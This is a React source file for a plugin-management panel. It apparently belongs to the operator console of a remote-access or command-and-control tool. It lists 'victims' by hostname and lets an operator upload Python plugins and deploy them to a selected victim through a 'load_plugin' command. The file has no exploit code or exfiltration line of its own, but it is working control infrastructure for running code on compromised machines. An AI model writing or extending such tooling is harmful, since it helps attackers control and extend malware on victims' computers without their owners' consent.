import React, { useState, useEffect, useRef } from 'react';
import { Upload, Download, Trash2, Package, Plus, Server, HardDrive, CheckCircle } from 'lucide-react';
import { Victim } from '../types';

interface PluginInfo {
  name: string;
  version: string;
  description: string;
  size: number;
}

interface PluginsPanelProps {
  victims: Victim[];
  sendCommand: (hostname: string, command: string, params?: Record<string, string>) => void;
  setToastMessage: (msg: { title: string; message: string; type: 'success' | 'danger' | 'warning' } | null) => void;
}

export const PluginsPanel: React.FC<PluginsPanelProps> = ({ victims, sendCommand, setToastMessage }) => {
  const [plugins, setPlugins] = useState<PluginInfo[]>([]);
  const [pluginLoads, setPluginLoads] = useState<Record<string, string[]>>({});
  const [targetHost, setTargetHost] = useState('');
  const [targetPlugin, setTargetPlugin] = useState('');
  const [loading, setLoading] = useState(false);
  const fileInputRef = useRef<HTMLInputElement>(null);

  const fetchPlugins = async () => {
    try {
      const resp = await fetch('/api/extensions');
      if (resp.ok) {
        setPlugins(await resp.json());
      }
    } catch {
      // server offline
    }
  };

  const fetchStatus = async () => {
    try {
      const resp = await fetch('/api/extensions/status');
      if (resp.ok) {
        setPluginLoads(await resp.json());
      }
    } catch {
      // server offline
    }
  };

  useEffect(() => {
    fetchPlugins();
    fetchStatus();
  }, []);

  const handleUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    const fd = new FormData();
    fd.append('file', file);
    try {
      const resp = await fetch('/api/extensions/register', { method: 'POST', body: fd });
      if (resp.ok) {
        const info = await resp.json();
        setToastMessage({ title: 'PLUGIN UPLOADED', message: `${info.name} v${info.version}`, type: 'success' });
        fetchPlugins();
      } else {
        const err = await resp.json();
        setToastMessage({ title: 'UPLOAD FAILED', message: err.error || 'unknown', type: 'danger' });
      }
    } catch {
      setToastMessage({ title: 'UPLOAD FAILED', message: 'connection error', type: 'danger' });
    }
    if (fileInputRef.current) fileInputRef.current.value = '';
  };

  const handleDelete = async (name: string) => {
    try {
      const resp = await fetch('/api/extensions/unregister', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ name }),
      });
      if (resp.ok) {
        setToastMessage({ title: 'PLUGIN DELETED', message: name, type: 'warning' });
        fetchPlugins();
        fetchStatus();
      }
    } catch {
      setToastMessage({ title: 'DELETE FAILED', message: 'connection error', type: 'danger' });
    }
  };

  const handleLoadOnVictim = () => {
    if (!targetHost || !targetPlugin) return;
    sendCommand(targetHost, 'load_plugin', { plugin_name: targetPlugin });
    setToastMessage({ title: 'LOAD PLUGIN', message: `${targetPlugin} → ${targetHost}`, type: 'success' });
  };

  return (
    <div className="flex-1 flex flex-col overflow-hidden p-5 gap-5">
      <div>
        <span className="font-mono text-[9px] text-slate-500 font-bold uppercase tracking-widest block mb-1">
          EXTENSION MODULES
        </span>
        <h2 className="font-sans text-sm font-black text-primary tracking-tight uppercase">
          Plugin Management
        </h2>
      </div>

      <div className="flex items-center gap-3">
        <input
          type="file"
          accept=".py"
          ref={fileInputRef}
          onChange={handleUpload}
          className="hidden"
        />
        <button
          onClick={() => fileInputRef.current?.click()}
          className="flex items-center gap-2 px-4 py-2 bg-cyan-500/10 border border-cyan-500/30 rounded-lg text-xs text-cyan-400 font-bold uppercase tracking-wider hover:bg-cyan-500/20 transition cursor-pointer"
        >
          <Upload className="h-3.5 w-3.5" />
          Upload Plugin
        </button>
        <button
          onClick={() => { fetchPlugins(); fetchStatus(); }}
          className="flex items-center gap-2 px-4 py-2 bg-slate-800 border border-slate-700 rounded-lg text-xs text-slate-300 font-bold uppercase tracking-wider hover:bg-slate-700 transition cursor-pointer"
        >
          Refresh
        </button>
      </div>

      <div className="flex-1 overflow-y-auto custom-scrollbar space-y-2">
        {plugins.length === 0 && (
          <div className="text-center py-12 text-slate-600 font-mono text-xs italic">
            &lt; No plugins on server &gt;
          </div>
        )}
        {plugins.map((p) => {
          const loadedHosts = pluginLoads[p.name] || [];
          return (
            <div key={p.name} className="bg-slate-900/40 border border-slate-800 rounded-lg p-4 flex items-start justify-between gap-3">
              <div className="flex items-start gap-3 min-w-0 flex-1">
                <div className="p-2 bg-cyan-900/20 text-cyan-400 border border-cyan-500/20 rounded-lg shrink-0">
                  <Package className="h-4 w-4" />
                </div>
                <div className="min-w-0 flex-1">
                  <h3 className="text-xs font-bold text-slate-200 uppercase tracking-wider truncate">{p.name}</h3>
                  <p className="text-[10px] text-slate-400 mt-0.5">v{p.version} — {p.size} bytes</p>
                  {p.description && (
                    <p className="text-[10px] text-slate-500 mt-1">{p.description}</p>
                  )}
                  {loadedHosts.length > 0 && (
                    <div className="mt-2 flex flex-wrap gap-1">
                      {loadedHosts.map((h) => (
                        <span key={h} className="inline-flex items-center gap-1 px-2 py-0.5 bg-emerald-950/30 border border-emerald-500/20 rounded text-[9px] text-emerald-400 font-mono">
                          <CheckCircle className="h-2.5 w-2.5" />
                          {h}
                        </span>
                      ))}
                    </div>
                  )}
                </div>
              </div>
              <div className="flex items-center gap-2 shrink-0">
                <button
                  onClick={() => handleDelete(p.name)}
                  className="p-1.5 text-rose-400 hover:bg-rose-500/10 rounded transition cursor-pointer"
                  title="Delete plugin"
                >
                  <Trash2 className="h-3.5 w-3.5" />
                </button>
              </div>
            </div>
          );
        })}

        {plugins.length > 0 && (
          <div className="bg-slate-900/60 border border-slate-800 rounded-lg p-4 space-y-3 mt-4">
            <h3 className="text-[10px] text-slate-500 font-bold uppercase tracking-wider flex items-center gap-2">
              <Download className="h-3 w-3" />
              Deploy Plugin to Target
            </h3>
            <div className="flex flex-col sm:flex-row gap-3">
              <select
                value={targetPlugin}
                onChange={(e) => setTargetPlugin(e.target.value)}
                className="flex-1 bg-slate-950 border border-slate-800 rounded-lg px-3 py-2 text-xs text-slate-300 focus:outline-none focus:border-cyan-500/60 font-mono"
              >
                <option value="">Select plugin...</option>
                {plugins.map((p) => (
                  <option key={p.name} value={p.name}>{p.name} v{p.version}</option>
                ))}
              </select>
              <select
                value={targetHost}
                onChange={(e) => setTargetHost(e.target.value)}
                className="flex-1 bg-slate-950 border border-slate-800 rounded-lg px-3 py-2 text-xs text-slate-300 focus:outline-none focus:border-cyan-500/60 font-mono"
              >
                <option value="">Select target...</option>
                {victims.map((v) => {
                  const hasPlugin = (v.loadedPlugins || []).includes(targetPlugin);
                  return (
                    <option key={v.id} value={v.id}>
                      {v.hostname}{hasPlugin ? ' (loaded)' : ''}
                    </option>
                  );
                })}
              </select>
              <button
                onClick={handleLoadOnVictim}
                disabled={!targetPlugin || !targetHost}
                className="px-4 py-2 bg-cyan-500/10 border border-cyan-500/30 rounded-lg text-xs text-cyan-400 font-bold uppercase tracking-wider hover:bg-cyan-500/20 transition disabled:opacity-40 disabled:cursor-not-allowed cursor-pointer shrink-0"
              >
                Deploy
              </button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};
